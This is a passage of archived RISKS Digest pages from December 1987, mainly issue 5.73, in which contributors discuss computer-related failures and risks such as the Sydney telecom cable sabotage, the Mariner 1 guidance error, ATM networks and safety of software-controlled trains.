An example (presumably) of blindly asking a computer to print out one
christmas letter for each human customer (as against company or corporate
entity) without first checking to see if the person is still thought to be
alive (by the absence of contary notice, such as a death certificate sent to
the bank to allow access to the deceased's account).  The Bank did receive
notice, otherwise they would not have marked it to be sent to a person "Decd."

Mail: Bill Lee, Dept. Electrical &amp; Electronic Engineering, University College,
UNSW, ADFA, Canberra. 2600.  Phone:  (062) 68 8193,  Telex:  ADFADM AA62030,
ACSNET: "bill@eeadfa.ee.adfa.oz"

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Air Traffic Control Computer Replacement Schedule
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 10 Dec 87 10:09:26 EST
From: Dan Ball &lt;ball@mitre.arpa&gt;

In RISKS 5.67 (01 Dec 87), Rodney Hoffman indicated that news accounts
concerning the recent failure of the 9020 computer at the Los Angeles Center
made no mention of a date for installation of a replacement computer system.

For your information, the replacement system has been installed at Los 
Angeles and is scheduled to be fully operational by March 01, 1988.
The replacement program has been proceeding ahead of schedule, with 
replacement computers operational at about one-third of the centers.
All sites are scheduled to be operational by June of 1988.

The 9020 computers are being replaced with dual redundant IBM 3083
processors which will rehost the existing applications software.
Reports from the field indicate that the reliability of the new
systems is significantly better than that of the 9020 as a result of
the new hardware and improvements in the operating system.

However, the new computers are running 18-year-old software, and the
display channel computer will not be replaced until the Advanced
Automation System is introduced in the next decade, so it may still
be necessary occasionally to shift to the less capable backup system,
hopefully much less frequently.

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
 Re: United Airlines O'Hare Sabotage?
</A>
</H3>
<address>
&lt;<A HREF="mailto:Mills@UDEL.EDU">
Mills@UDEL.EDU
</A>&gt;
</address>
<i>
Thu, 10 Dec 87 10:26:29 EST
</i><PRE>

There was a famous incident at an AT&amp;T CO in Manhattan many years ago when a
fire destroyed much of the office. The rebuilding program was so intricate and
extensive that it was written up in a technical journal. Recently a similar
thing happened in Brooklyn, but I don't have the details. I was told at a NAS
meeting yesterday that AT&amp;T has a videotape documenting the rebuilding effort.
Apparently, most of the effort goes into re-coppering and re-framing the
loops. I would guess that extensive use of highly multiplexed glass might make
such rebuilding much easier. Maybe the increase in robustness in the face of
massive destruction of CO facilities will balance the vulerability to backhoe
attack.
                                    Dave

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.71.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.73.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-25</DOCNO>
<DOCOLDNO>IA012-000130-B022-335</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.73.html 128.240.150.127 19970217014535 text/html 30076
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:43:58 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 73</TITLE>
<LINK REL="Prev" HREF="/Risks/5.72.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.74.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.72.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.74.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 73</H1>
<H2> Sunday, 13 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Australian datacom blackout 
</A>
<DD>
<A HREF="#subj1.1">
Barry Nelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Finally, a primary source on Mariner 1 
</A>
<DD>
<A HREF="#subj2.1">
John Gilmore
</A><br>
<A HREF="#subj2.2">
 Doug Mink
</A><br>
<A HREF="#subj2.3">
 Marty Moore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Computer-controlled train runs red light 
</A>
<DD>
<A HREF="#subj3.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: interconnected ATM networks 
</A>
<DD>
<A HREF="#subj4.1">
John R. Levine
</A><br>
<A HREF="#subj4.2">
 Darren New
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Control-tower fires 
</A>
<DD>
<A HREF="#subj5.1">
dvk
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Loss-of-orbiter 
</A>
<DD>
<A HREF="#subj6.1">
Dani Eder
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: EEC Product Liability 
</A>
<DD>
<A HREF="#subj7.1">
John Gilmore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  The Presidential "Football"... 
</A>
<DD>
<A HREF="#subj8.1">
Carl Schlachte
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Radar's Growing Vulnerability 
</A>
<DD>
<A HREF="#subj9.1">
Jon Eric Strayer
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Australian datacom blackout
</A>
</H3>
<address>
Barry Nelson 
&lt;<A HREF="mailto:bnelson@ccb.bbn.com">
bnelson@ccb.bbn.com
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 16:11:43 EST
</i><PRE>
To: risks@csl.sri.com
Cc: telecom@xx.lcs.mit.edu

From The Australian, 23 November 1987, Sydney, Australia, Page 1, 2nd edition.
[without permission]

8-Column BANNER: SABOTEUR TRIED TO BLACK OUT AUSTRALIA

The heart of Sydney's business district remains in chaos after a dangerously
well-informed saboteur wreaked havoc on the city's fragile telecommunications
system in an attack intended to destroy [Australian] Telecom's operations
nationwide. [An estimated 2000 central city services remain out this morning]

Investigators described the sinister saboteur as a lone, former Telecom
employee with expert knowledge of the underground cables network.

[...] But Telecom said it could have been much worse.  [only Sydney was hit]
but all international services are routed through Sydney [...] 

[The attacker entered the underground tunnels and] severed 24 of the 600 heavy
cables in 10 carefully selected locations.  The bizarre attack knocked out
35,000 telephone lines in 40 Sydney suburbs and brought dozens of [ATMs, POS,
stores, telex, facsimile and betting office] services to a standstill.  [...]

Hundreds of computers broke down, leaving communications and computer
specialists to ponder the real possibility  of vital information being erased
from tapes in banking, insurance and other industries. 

[The largest banks and the international and local PTT offices were all cut
off.  Speculation is that the attacker's information was over two years old
because the same attack at that time would have completely crippled Telecom
Australia. Security locks have now been put on the manhole covers. Just the
reconnection effort is estimated to cost millions of dollars and full damages
will not be known until businesses have time to detect losses.  A man seen
leaving a manhole on Wednesday night was possibly the saboteur reconnoitering
his targets. ...]

Page 2, 4-columns, 5x7 foto - SABOTAGE IS A NIGHTMARE FOR TELECOM'S WEARY BAND

Four hundred Telecom managers, technicians and linesmen worked frantically
toward today's 9am deadline [to restore the damaged services. Some worked 48
hours straight with only brief napping.]

When the enormity of the sabotage was realised (sic) on Friday, a team of
technicians and linesmen was sent into the tunnels to discover the damage.  The
cuts, which were only a centimeter across, could only be found by touch in the
dark, dank tunnels.

"The workmen had to run their hands along the entire length of the cables until
all the cuts were discovered. Some of them walked over 20 miles on Friday
night", said Roger Bamber, the [New South Wales] Telecom Operations Manager
[The system contains 27 km of tunnels. It is estimated that the damage could
have been done by one well-prepared man over a period of less than one hour.]


Things started to go wrong in the city about 7pm on Friday, and workmen
searched through the night until 6am to find all the damage.  [Other searches
were launched over half the state for bombs or other evidence of sabotage.]

[  ... in other articles ]

[Employees' anger at turncoat Telecom policies suggest an insider hacked the
cables.  The telephone workers' union objects to deregulation which has
resulted in years of acrimonious debate.  Last week's Telecom statements
suggested that an independent regulator will be created.  The union doesn't
approve of this action and prefers monopoly.]

-----One must wonder if the REAL crime was obscured by the Telecom outage-----

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Finally, a primary source on Mariner 1
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:hoptoad.UUCP!gnu@cgl.ucsf.edu ">
hoptoad.UUCP!gnu@cgl.ucsf.edu 
</A>&gt;
</address>
<i>
Sun, 13 Dec 87 05:30:10 PST
</i><PRE>

My friend Ted Flinn at NASA (flinn@toad.com) dug up this reference
to the Mariner 1 disaster, in a NASA publication SP-480, "Far Travelers --
The Exploring Machines", by Oran W. Nicks, NASA, 1985.  "For sale by the
Superintendent of Documents, US Government Printing Office, Wash DC."
Nicks was Director of Lunar and Planetary Programs for NASA at the time.
The first chapter, entitled "For Want of a Hyphen", explains:

"We had witnessed the first launch from Cape Canaveral of a spacecraft
that was directed toward another planet.  The target was Venus, and the
spacecraft blown up by a range safety officer was Mariner 1, fated to
ride aboard an Atlas/Agena that wobbled astray, potentially endangering
shipping lanes and human lives."

..."A short time later there was a briefing for reporters; all that
could be said -- all that was definitely known -- was that the launch
vehicle had strayed from its course for an unknown reason and had been
blown up by a range safety officer doing his prescribed duty."

"Engineers who analyzed the telemetry records soon discovered that two
separate faults had interacted fatally to do in our friend that
disheartening night.  The guidance antenna on the Atlas performed
poorly, below specifications.  When the signal received by the rocket
became weak and noisy, the rocket lost its lock on the ground guidance
signal that supplied steering commands.  The possibility had been
foreseen; in the event that radio guidance was lost the internal
guidance computer was supposed to reject the spurious signals from the
faulty antenna and proceed on its stored program, which would probably
have resulted in a successful launch.  However, at this point a second
fault took effect.  Somehow a hyphen had been dropped from the guidance
program loaded aboard the computer, allowing the flawed signals to
command the rocket to veer left and nose down.  The hyphen had been
missing on previous successful flights of the Atlas, but that portion of
the equation had not been needed since there was no radio guidance
failure.  Suffice it to say, the first U.S. attempt at interplanetary
flight failed for want of a hyphen."

</PRE>
<HR><H3><A NAME="subj2.2">
Mariner 1 from NASA reports
</A>
</H3>
<address>
Doug Mink
&lt;<A HREF="mailto:mink%cfa@harvard.harvard.edu ">
mink%cfa@harvard.harvard.edu 
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 11:42:36 EST
</i><PRE>

JPL's Mariner Venus Final Project Report (NASA SP-59, 1965)
gives a chronology of the final minutes of Mariner 1 on page 87:

4:21.23	Liftoff
4:25	Unscheduled yaw-lift maneuver
	"...steering commands were being supplied, but faulty application
	of the guidance equations was taking the vehicle far off course."
4:26:16	Vehicle destroyed by range safety officer 6 seconds before
	separation of Atlas and Agena would have made this impossible.

In this report, there is no detail of exactly what went wrong, but "faulty
application of the guidance equations" definitely points to computer error.
"Astronautical and Aeronautical Events of 1962," is a report of NASA to the
House Committee on Science and Astronautics made on June 12, 1963.  It
contains a chronological list of all events related to NASA's areas of
interest.  On page 131, in the entry for July 27, 1962, it states:

	NASA-JPL-USAF Mariner R-1 Post-Flight Review Board determined that
	the omission of a hyphen in coded computer instructions transmitted
	incorrect guidance signals to Mariner spacecraft boosted by two-stage
	Atlas-Agena from Cape Canaveral on July 21.  Omission of hyphen in
	data editing caused computer to swing automatically into a series of
	unnecessary course correction signals which threw spacecraft off
	course so that it had to be destroyed.

So it was a hyphen, after all.  The review board report was followed by a
Congressional hearing on July 31, 1962 (ibid., p.133):

	In testimony befre House Science and Astronautics Committee, Richard
	B. Morrison, NASA's Launch Vehicles Director, testified that an error
	in computer equations for Venus probe launch of Mariner R-1 space-
	craft on July 21 led to its destruction when it veered off course.

Note that an internal review was called AND reached a conclusion SIX DAYS
after the mission was terminated.  I haven't had time to look up Morrison's
testimony in the Congressional Record, but I would expect more detail
there.  The speed with which an interagency group could be put together
to solve the problem so a second launch could be made before the 45-day
window expired and the lack of speed with which more recent problems
(not just the Challenger, but the Titan, Atlas, and Ariane problems
of 1986 says something about 1) how risks were accepted in the 60's,
2) growth in complexity of space-bound hardware and software, and/or
3) growth of the bureaucracy, each member of which is trying to avoid
taking the blame.  It may be that the person who made the keypunch
error (the hyphen for minus theory sounds reasonable) was fired, but
the summary reports I found indicated that the spacecraft loss was
accepted as part of the cost of space exploration.

Doug Mink, Harvard-Smithsonian Center for Astrophysics, Cambridge, MA
Internet:  mink@cfa.harvard.edu
UUCP:	   {ihnp4|seismo}!harvard!cfa!mink

</PRE>
<HR><H3><A NAME="subj2.3">
Mariner I
</A>
</H3>
<address>
"Marty Moore" 
&lt;<A HREF="mailto:mooremj@aim.rutgers.edu">
mooremj@aim.rutgers.edu
</A>&gt;
</address>
<i>
11 Dec 87 16:54:00 EST
</i><PRE>
To: "risks" &lt;risks@csl.sri.com&gt;

I've just caught up on two months of back RISKS issues.  I have the
following to contribute on Mariner I, based on my time at the Cape:

1.  Mariner I was before my time, but I was told the story by a mathematician
who had been at the Cape since 1960.  According to him, an algorithm, written
as mathematical formulae, involved a Boolean entity R.  At the point of
failure, the mathematician had written NOT-R, that is, "R" with a bar above
the character; however, the programmer implementing the algorithm overlooked
the bar, and so used R when he should have used NOT-R.  This explanation could
subesequently have been interpreted as "missing hyphen", "missing NOT", or
"data entry problem", all of which we've seen in recent contributions. 

2.  I think the FORTRAN version of the story is very unlikely.  Remember that
the error occurred in a critical on-board computer.  I consider it extremely
unlikely that such a computer would have been programmed in FORTRAN in 1962,
considering that the first use I saw of FORTRAN in a ground-based critical
system at the Cape was not until 1978!  (Of course, I wasn't aware of *every*
computer in use, so there may have been an earlier use of FORTRAN, but I'd be
surprised if it was more than a few years earlier.)  It is possible that the
originator of the FORTRAN version of the story may have been aware of another
error caused by the period/comma substitution, and also aware of the Mariner
problem as a "single character" error, and incorrectly associated the two. 

         [There were other messages (e.g., from Eric Roberts, Eugene Miya, 
         and Jim Valerio) on this subject as well, but there is too much 
         redundancy or lack of definitude to include them all...  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Computer-controlled train runs red light
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Sat, 12 Dec 87 20:31:44 -0800
From: Nancy Leveson &lt;nancy@commerce.UCI.EDU&gt;

In Risks 5.69, Steve Nuchia writes:

   &gt;Surely these engineers can't be so paranoid as to think that an exact
   &gt;duplication of their (primarily digital) relay-based control system in
   &gt;software would be hard to verify.  It should at least be possible to build a
   &gt;software implementation that could be easily shown to be equivalent to the
   &gt;relays, leaving aside the problem of validating an arbitrary "spagetti code"
   &gt;implementation.

The failure modes of mechanical systems are usually well understood and
very limited in number.  Therefore, system safety engineers are able to
build in interlocks and other safety devices to control these hazards.
The failure modes of software are much more complex and less is known
about how to control software hazards.  Even if the same functionality
is implemented in the software, that does not mean that the failure modes
and mechanisms are identical nor that the complexity of the two systems is
equivalent.  Software also exhibits discontinuities not usually found in 
mechanical relay systems.  

If identical function is implemented in software, then the probability of 
requirements errors in the software is equivalent to design errors in the 
mechanical system.  But there is an additional possibility of introducing 
implementation errors in the software.  Given identical function of both 
types of systems (and thus identical probability of accidents arising from 
problems in this functional design), then the additional probability of design 
and coding errors in the software is not necessarily identical to the 
probability of random "wearout" failures in the mechanical system (the 
primary cause of failures in mechanical systems).

   &gt;Automobile traffic light control boxes, based on relay technology quite
   &gt;similar to that used in railroads, fail every so often due to ants building
   &gt;mounds in the nice warm cabinets.  People have been killed by this bug in a
   &gt;relay system, yet it fails to generate the kind of emotional response that
   &gt;software bugs do.  ---

Certainly there are accidents in conventional mechanical systems.  However,
the concern about software bugs is more than just an irrational emotional
response.  There are very good scientific reasons for it.  Besides that
noted above (greater understanding of failure modes and mechanisms in
mechanical systems and thus better methods to control hazards), it is 
also possible to perform risk assessment on mechanical systems due to 
reuse of standard components with historical failure probability data.  
This is not possible for software.  Certainly these risk figures are 
not always accurate, but it is not irrational to feel more comfortable 
about a system with a calculated risk of an accident of 10^-9 over 10 years 
time than a system with a calculated risk of "?".  

Besides, I question whether accidents caused by mechanical failures generate
less emotional response than accidents caused by software bugs.  Consider
Challenger and Three Mile Island.  It is natural for computer scientists to
have considerable interest in computer-related accidents and reasonable for
non-computer scientists to be worried about software bugs.
                                                            Nancy Leveson, UCI

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: interconnected ATM networks
</A>
</H3>
<address>
John R. Levine
&lt;<A HREF="mailto:johnl@ima.ISC.COM ">
johnl@ima.ISC.COM 
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 22:06:27 EST
</i><PRE>

The story about BayBanks vs. Bank of Boston ATM cards is even more interesting
than it initially sounds.  BayBanks and Bank of Boston are arch-rivals in
consumer banking, and they run the two largest ATM networks in the region,
XPress 24 and Yankee 24, respectively.  (Yankee 24 is a consortium, but Bank of
Boston is by far the largest participating bank.)  When Yankee 24 was expanded
from its Connecticut base to cover all of New England, XPress 24 was invited to
join, but they declined and BayBanks has since filed an anti-trust suit against
Yankee 24, so far to no effect.

A few years ago, the two banks jointly set up a system of retail store cash
dispensers called Money Supply.  Both XPress 24 cards and Monec cards (Bank of
Boston's previous network, now folded into Yankee 24) work at Money Supply
machines.  One day shortly after Money Supply came up, while waiting for a
plane at Logan Airport in Boston, I noticed that one of the BayBank XPress 24
machines had a small Money Supply sticker on it, and upon trying my Bank of
Boston card, was surprised to discover that it worked.  Subsequent
experimentation showed that other than the four airport BayBank machines,
neither bank's machines accepted the other's cards, and the XPress 24 machines
gave a peculiar message that "your bank has restricted use of this card at this
terminal."  The fact that Bank of Boston cards worked at the airport was not
widely known, even at the two banks.

Thus I was as surprised as anybody to discover that when both banks joined
NYCE, they started taking each other's cards, since I was under the impression
that BayBanks' network already routed Bank of Boston requests via other paths
which were usually blocked, and vice versa.

This suggests that perhaps BayBanks doesn't entirely understand how their ATM
network routes messages to off-network banks.  If I were they, I'd be pretty
nervous.

John Levine, johnl@ima.isc.com or ima!johnl or Levine@YALE.something

</PRE>
<HR><H3><A NAME="subj4.2">
Re: ATM PIN numbers
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Sun, 29 Nov 87 21:40:17 -0500
From: new@UDEL.EDU

For what it is worth, the PINs for Mellon cards are not stored on the cards.
I had both a checking and a savings account at Mellon.  Several years after
opening them, I closed the checking account but retained the savings
account. All of a sudden, the card no longer worked.  I visited a branch
office in person to find out what happened.  It seems that when the checking
account closed, the first digit of the PIN number changed. The clerk implied
that I had simply forgotten what the number was, but this was not the case;
I had been using the number for years. I suspect that the data entry person
who closed the account bumped the wrong key on the screen form, accidently
changing the PIN field. I never followed it further. However, since the card
was never out of my possession, I know that the PIN is not on the card.

With regard to Otto Makela's "Your bank's computer is down" message
appearing after entering the PIN: I suspect that all of your information is
gathered before any connection to your bank is attempted. This prevents
tying up the lines during "think time". I think the X.25 standards even
include a special kind of "open connection" packet, whereby an encrypted
batch of data is sent off and a yes/no reply comes back without any true
"connection" ever being established. Of course, this does not invalidate any
of his points, nor does it imply that other countries or banks follow the
same protocols as Mellon Bank, USA.
                                              Darren New
      [For the record, there were somewhat overlapping messages from 
      John McLeod, Robert Stroud, B.J. Herbison, and Peter da Silva.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Control-tower fires
</A>
</H3>
<address>
&lt;<A HREF="mailto:dvk@SEI.CMU.EDU">
dvk@SEI.CMU.EDU
</A>&gt;
</address>
<i>
Wed, 9 Dec 87 10:28:01 EST
</i><PRE>

Control-tower fire - a nightmare that wasn't...

I was flying out of Cairo airport in 1982 or so, and the night before they
had had a control tower fire.  The immediately visible ramifications of this
were that none of the terminal monitors (the flip chart kind you see in
European train stations) were working, and the gate agents reported delays on
almost every outbound flight (I am not sure about inbound flights - I got to
the airport at 6:45am (for a 10:30am flight) so there was not much inbound).

Cairo International is a fairly busy aiport, yet most of the flights were
departing within an hour of scheduled departure time (i.e., they were "on time"
for Cairo).  The reason for this is that they had ATCs in the burned out
shell of the control tower visually sighting aircraft on the ground (and
possibly in the air), communicating via walkie-talkies to the aircraft and to
ground based directors who literally waved the planes onto the runways.

Basically, everything worked.  Why?  Because the airport was able to shift
into a manual mode of operation when the tower (and computers?) were down.
There were no super failsafes to get in the way.  Now, I am not advocating
the removal of failsafes.  What I am suggesting is that our current failsafes
be made a little less restrictive.  In Chuck Weinstock's post about O'Hare,
the aircraft had trouble getting fuel because of safety interlocks, even when
technicians *knew* there was no danger to the fuel feed.  In Cairo, the whole
system was toasted, but it kept running.  Granted, there are differences, but
there are also lessons to be learned here.  Failsafes whould keep you from
making stupid mistakes, but not prevent you from making intelligent decisions.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Loss-of-orbiter (Re: RISKS DIGEST 5.70)
</A>
</H3>
<address>
Dani Eder
&lt;<A HREF="mailto:ucbcad!ames.UUCP!uw-beaver!ssc-vax!eder@ucbvax.Berkeley.EDU ">
ucbcad!ames.UUCP!uw-beaver!ssc-vax!eder@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 11:39:44 pst
</i><PRE>

Reliability work done here at Boeing (as part of the Advanced Launch System
program) predicts the loss-of-orbiter rate to be 1 in 60 launches AFTER the
fixes in progress are completed.  The loss of crew rate is somewhat lower,
since there are accidents where you render an Orbiter unuseable, but do not
kill the crew.  For example, landing hard can stress the structure enough that
it would be unsafe to ever fly again, but with no visible damage occurring.

What our reliability work indicates, is that adoption of airplane-like design
rules: such as ability to fly a mission with a single engine failure, all
engines running before launch, double and triple redundant flight control
systems, and powered (jet engine) return to a runway for the booster stage,
should bring the loss-of-payload for a next generation rocket to 1 in 5000
flights.

The lesson we learned from the commercial airplane side of the company is: use
improved technology (such as lighter structural materials and smaller
electronics) to get better reliability rather than a few more pounds of
performance.  Your hardware will last longer, and costs will come down more
that way.
                 Dani Eder/Boeing/Advanced Space Transportation

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: EEC Product Liability
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:hoptoad.UUCP!gnu@cgl.ucsf.edu ">
hoptoad.UUCP!gnu@cgl.ucsf.edu 
</A>&gt;
</address>
<i>
Sun, 13 Dec 87 05:13:40 PST
</i><PRE>

&gt; For imported goods, the original importer into the EEC is liable.

I am curious how long the US-&gt;European email/netnews gateway at mcvax will
last after its first suit under this Directive.  Plenty of buggy PD and
redistributable software enters the EEC this way; in fact, it may be
the largest single channel for import of software.

&gt; It is expected that the Act will greatly increase the adoption of software
&gt; Quality Assurance (to conform to ISO standard ISO 9001) and the use of
&gt; mathematically rigorous specification and development methods (VDM, Z etc).

Note that this is posted by someone who makes his living selling such
products (at Praxis).  I would say "caveat emptor" but clearly in Europe
this no longer applies.

It might be fun for someone to sue Praxis for bugs in their product,
especially bugs that result in delivered systems with undiagnosed
failures which later cause suits.

Does Lloyd's of London sell "bug insurance"?

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 The Presidential "Football"...
</A>
</H3>
<address>
&lt;<A HREF="mailto:hplabs!motsj1!motbos!mcdham!carl@ucbvax.Berkeley.EDU">
hplabs!motsj1!motbos!mcdham!carl@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Sat, 12 Dec 87 10:17:19 PST
</i><PRE>

I am looking for information related to the "Black Box" that is supposedly
near the President at all times.  This box is reportedly the control center
from which the President can authorize a nuclear launch.  I have heard it
referred to as "The Football".

Can anyone tell me anything about it?  Even folklore is acceptable.  Are
there any texts with this information in it?

Whatever you could let me know would be a help.  I am writing a fictional
account of a Nuclear War and need the inforrmation to complete the work.
Thanks in advance for your help.
                                           Carl Schlachte

            [Folklore may be OK for Carl, but please provide him with
            folklore privately, and keep RISKS messages factual.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Radar's Growing Vulnerability
</A>
</H3>
<address>
Jon Eric Strayer
&lt;<A HREF="mailto:ndq@h.cc.purdue.edu ">
ndq@h.cc.purdue.edu 
</A>&gt;
</address>
<i>
Thu, 10 Dec 87 15:51:10 EST
</i><PRE>

  &gt;From: Peter G. Neumann &lt;NEUMANN@csl.sri.com&gt;
  ... (RISKS readers will recall that the British investigation concluded that 
  the Sheffield's own radars were jammed by a communication back to London that
  was being held at the time.)

While there are anti-radiation missiles, the Exocet that hit the Sheffield was 
not one of them.  I also have serious doubts that the Sheffield's radars were 
"jammed" by a communication transmitter.  I understand that the radars (and
ESM/ECM equipment) were shut off because they jammed the comm equipment.

   [Yes, that was one report.  Sorry I turned it around.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.72.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.74.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-26</DOCNO>
<DOCOLDNO>IA012-000130-B022-353</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.74.html 128.240.150.127 19970217014558 text/html 23235
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:44:16 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 74</TITLE>
<LINK REL="Prev" HREF="/Risks/5.73.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.75.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.73.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.75.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
